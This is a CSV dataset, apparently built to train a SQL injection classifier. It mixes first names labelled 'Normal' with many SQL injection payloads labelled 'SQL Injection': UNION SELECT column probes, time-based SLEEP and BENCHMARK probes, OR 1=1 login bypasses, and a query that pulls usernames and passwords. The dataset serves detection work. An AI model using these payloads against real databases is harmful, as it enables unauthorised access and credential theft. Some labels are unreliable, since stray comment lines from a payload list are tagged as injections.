"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
'ORDER BY 17',SQL Injection
'David',Normal
'ORDER BY 21#',SQL Injection
'Fran',Normal
'Alice',Normal
'Bob',Normal
'Alice',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
"'ORDER BY 1,SLEEP(5),3--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
'ORDER BY SLEEP(5)',SQL Injection
'Hank',Normal
'John',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
'Fran',Normal
'Hank',Normal
'David',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'",SQL Injection
'Bob',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10'",SQL Injection
'Jill',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'",SQL Injection
'Grace',Normal
'Bob',Normal
'Jill',Normal
'Fran',Normal
'Alice',Normal
'Hank',Normal
'Charlie',Normal
'John',Normal
'Grace',Normal
"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--'",SQL Injection
"'or benchmark(50000000,MD5(1))--'",SQL Injection
'Grace',Normal
'Eve',Normal
'ORDER BY 21',SQL Injection
'ORDER BY 9#',SQL Injection
'or SLEEP(5)='',SQL Injection
'David',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Eve',Normal
'Bob',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
'Fran',Normal
'Eve',Normal
'Grace',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11'",SQL Injection
'Hank',Normal
'ORDER BY 8#',SQL Injection
'Hank',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
'AND 1=0--',SQL Injection
'ORDER BY 21#',SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--'",SQL Injection
'Hank',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'",SQL Injection
'Hank',Normal
'Hank',Normal
'Jill',Normal
'David',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
'David',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
'Grace',Normal
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
'Fran',Normal
'ORDER BY 15#',SQL Injection
'Jill',Normal
'Fran',Normal
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'",SQL Injection
'Bob',Normal
'Grace',Normal
'Eve',Normal
'Hank',Normal
'' or ''*'',SQL Injection
'ORDER BY 20--',SQL Injection
'Eve',Normal
'Charlie',Normal
'Fran',Normal
'Jill',Normal
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16'",SQL Injection
'Alice',Normal
'Fran',Normal
'Bob',Normal
'ORDER BY 12',SQL Injection
'ORDER BY SLEEP(5)',SQL Injection
'Eve',Normal
'Jill',Normal
'David',Normal
'David',Normal
'Bob',Normal
'Alice',Normal
'Eve',Normal
'David',Normal
'Bob',Normal
'Eve',Normal
'Bob',Normal
"'"""");",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Hank',Normal
'OR 1=1#',SQL Injection
'Hank',Normal
'Grace',Normal
'Charlie',Normal
'Charlie',Normal
"'admin"""") or (""""1""""=""""1""""#'",SQL Injection
'WHERE 1=1 AND 1=0',SQL Injection
'John',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
'Hank',Normal
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'",SQL Injection
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'",SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
'HAVING 1=0#',SQL Injection
'Eve',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#'",SQL Injection
'Grace',Normal
'Bob',Normal
'Alice',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--'",SQL Injection
'Charlie',Normal
'David',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'",SQL Injection
'Grace',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'",SQL Injection
'Jill',Normal
'Jill',Normal
"'""""""""'",SQL Injection
'AND 1=0#',SQL Injection
'OR x=x',SQL Injection
'Hank',Normal
'David',Normal
'Bob',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'ORDER BY 11--',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6'",SQL Injection
'1' ORDER BY 2--+',SQL Injection
'OR x=x--',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--'",SQL Injection
"'admin"""" or """"1""""=""""1""""/*'",SQL Injection
'John',Normal
"'and (select substring(@@version,3,1))='X''",SQL Injection
'or 1=1/*',SQL Injection
'John',Normal
'Comments:',SQL Injection
'Jill',Normal
'David',Normal
'Jill',Normal
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
'Grace',Normal
'') or pg_sleep(5)--',SQL Injection
'Alice',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'",SQL Injection
'Charlie',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'",SQL Injection
'&&SLEEP(5)#',SQL Injection
'UNION ALL SELECT 'INJ'||'ECT'||'XXX'#',SQL Injection
'UNION ALL SELECT SLEEP(5)--',SQL Injection
"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
'Alice',Normal
'HAVING 1=1--',SQL Injection
''''''''''''''UNION SELECT '2',SQL Injection
'David',Normal
'Grace',Normal
'Hank',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
'John',Normal
'Hank',Normal
'David',Normal
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--'",SQL Injection
'Alice',Normal
'Hank',Normal
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
'Grace',Normal
'UNION ALL SELECT 1',SQL Injection
'Eve',Normal
'Fran',Normal
'Grace',Normal
'Fran',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
'Fran',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'",SQL Injection
'+ SLEEP(10) + '',SQL Injection
'AND 1=0 AND '%'='',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
'Jill',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
'' OR 'x'='x',SQL Injection
'Alice',Normal
"'"""" or """"""""*""""'",SQL Injection
';,SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
'Bob',Normal
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7--'",SQL Injection
'Grace',Normal
'Grace',Normal
'Fran',Normal
'David',Normal
'' OR 'x'='x',SQL Injection
'John',Normal
'Alice',Normal
'Charlie',Normal
'John',Normal
'Alice',Normal
'Eve',Normal
'Hank',Normal
'Bob',Normal
"'' or """"'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
"'benchmark(50000000,MD5(1))#'",SQL Injection
'Fran',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
'John',Normal
'Fran',Normal
'Charlie',Normal
'Hank',Normal
"'admin"""") or (""""1""""=""""1'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
'Jill',Normal
'Fran',Normal
'Bob',Normal
'UNION ALL SELECT 1#',SQL Injection
'Fran',Normal
'Fran',Normal
'ORDER BY 23#',SQL Injection
'Eve',Normal
'Eve',Normal
"'admin"""" or """"1""""=""""1""""--'",SQL Injection
'Fran',Normal
'Bob',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
'Alice',Normal
"'' UNION SELECT 1,2,3 --'",SQL Injection
'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#'",SQL Injection
'Alice',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'",SQL Injection
'Alice',Normal
'OR x=x--',SQL Injection
'Eve',Normal
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
'Jill',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
"','",SQL Injection
'Bob',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'",SQL Injection
'Charlie',Normal
'David',Normal
'ORDER BY 28#',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12'",SQL Injection
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
"'' UNION SELECT 1,2,3 --'",SQL Injection
'AnD SLEEP(5)--',SQL Injection
'Eve',Normal
'John',Normal
'Eve',Normal
'Bob',Normal
'AND true',SQL Injection
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--'",SQL Injection
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
'John',Normal
'Charlie',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
'John',Normal
'Eve',Normal
'Alice',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8'",SQL Injection
'ORDER BY 19#',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
'# from wapiti',SQL Injection
"'ORDER BY 1,SLEEP(5)#'",SQL Injection
'Hank',Normal
'Eve',Normal
'Alice',Normal
'Alice',Normal
'||		(double pipe) concatenate',SQL Injection
'Hank',Normal
'David',Normal
'UNION ALL SELECT NULL',SQL Injection
'Bob',Normal
"'admin""""or 1=1 or """"""""=""""'",SQL Injection
'Fran',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
'Bob',Normal
"'-1 UNION SELECT 1 INTO @,@,@'",SQL Injection
'Alice',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'",SQL Injection
'Jill',Normal
"'UNION SELECT @@VERSION,SLEEP(5),""""'3'",SQL Injection
'WHERE 1=1 AND 1=1--',SQL Injection
"'' UNION SELECT null, username, password FROM users --'",SQL Injection
'Hank',Normal
'WHERE 1=1 AND 1=1--',SQL Injection
"'admin"""") or """"1""""=""""1'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
'ORDER BY 10--',SQL Injection
'Charlie',Normal
'Jill',Normal
'Charlie',Normal
'Grace',Normal
'Eve',Normal
'Alice',Normal
'David',Normal
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'",SQL Injection
'Bob',Normal
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'",SQL Injection
"'+		addition, concatenate (or space in url)'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
'Charlie',Normal
'John',Normal
'Grace',Normal
'WHERE 1=1 AND 1=1#',SQL Injection
'Hank',Normal
'Jill',Normal
'ORDER BY SLEEP(5)',SQL Injection
'John',Normal
'Charlie',Normal
'Eve',Normal
'John',Normal
'||		(double pipe) concatenate',SQL Injection
'Eve',Normal
"'"""");",SQL Injection
'John',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'",SQL Injection
'Alice',Normal
'Jill',Normal
'Fran',Normal
'John',Normal
'Alice',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
'Hank',Normal
"'"""" OR 1 = 1 -- -'",SQL Injection
"'"""" or pg_sleep(5)--'",SQL Injection
'AND 1=1--',SQL Injection
'Charlie',Normal
'John',Normal
'David',Normal
'Alice',Normal
'Grace',Normal
'Fran',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
'Jill',Normal
"'"""" or """"""""-""""'",SQL Injection
'ORDER BY 15--',SQL Injection
'Jill',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'or pg_SLEEP(5)#',SQL Injection
'Charlie',Normal
'Bob',Normal
'David',Normal
"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
'Charlie',Normal
'Grace',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
"'"""" or """"""""^""""'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
'Grace',Normal
'Bob',Normal
'Alice',Normal
'ORDER BY 10#',SQL Injection
'Jill',Normal
'Hank',Normal
'Charlie',Normal
"',(select * from (select(sleep(10)))a)'",SQL Injection
'Fran',Normal
'Hank',Normal
',SQL Injection
"'ORDER BY 1,SLEEP(5),3,4--'",SQL Injection
'Eve',Normal
'David',Normal
'Charlie',Normal
'UNION ALL SELECT NULL',SQL Injection
"'""""""""'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
'Bob',Normal
'Eve',Normal
'Alice',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
'Grace',Normal
'Alice',Normal
'''',SQL Injection
'UNION ALL SELECT NULL',SQL Injection
Microservice running on port 3000,Normal
'Charlie',Normal
'John',Normal
'Bob',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
'David',Normal
'Eve',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
"'UNION ALL SELECT 1,2'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
'WHERE 1=1 AND 1=1',SQL Injection
'/*  	C-style comment',SQL Injection
"','",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
'Jill',Normal
'Charlie',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
'AS INJECTX WHERE 1=1 AND 1=1',SQL Injection
'Grace',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'",SQL Injection
'John',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Eve',Normal
'Charlie',Normal
"'admin"""" or """"1""""=""""1""""#'",SQL Injection
'Fran',Normal
'Bob',Normal
'Hank',Normal
'AND 1=1 AND '%'='',SQL Injection
'David',Normal
"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
'Bob',Normal
'Fran',Normal
'John',Normal
'Charlie',Normal
"'"""" OR """""""" = """"'",SQL Injection
'OR 1=1',SQL Injection
'Bob',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#'",SQL Injection
'Grace',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#'",SQL Injection
'Alice',Normal
'Grace',Normal
'OR 1=1--',SQL Injection
'Charlie',Normal
'Alice',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
'Alice',Normal
'Jill',Normal
'Hank',Normal
'John',Normal
"'"""" or sleep(5)=""""'",SQL Injection
'Grace',Normal
'David',Normal
'Jill',Normal
'ORDER BY 19--',SQL Injection
'Charlie',Normal
''&&SLEEP(5)&&'1',SQL Injection
'# Numeric',SQL Injection
'Bob',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
'Grace',Normal
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
"'and (select substring(@@version,2,1))='i''",SQL Injection
"''\""""'",SQL Injection
'John',Normal
'Grace',Normal
'Eve',Normal
"'"""" OR """""""" = """"'",SQL Injection
'Fran',Normal
'John',Normal
'Charlie',Normal
'Grace',Normal
"'"""") or (""""x"""")=(""""x'",SQL Injection
'Jill',Normal
'Jill',Normal
'Grace',Normal
'Charlie',Normal
'Fran',Normal
'Grace',Normal
'Fran',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
''''''''''''''UNION SELECT '2',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
'Alice',Normal
'Jill',Normal
'ORDER BY 12--',SQL Injection
'+ SLEEP(10) + '',SQL Injection
'Hank',Normal
'ORDER BY 30#',SQL Injection
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
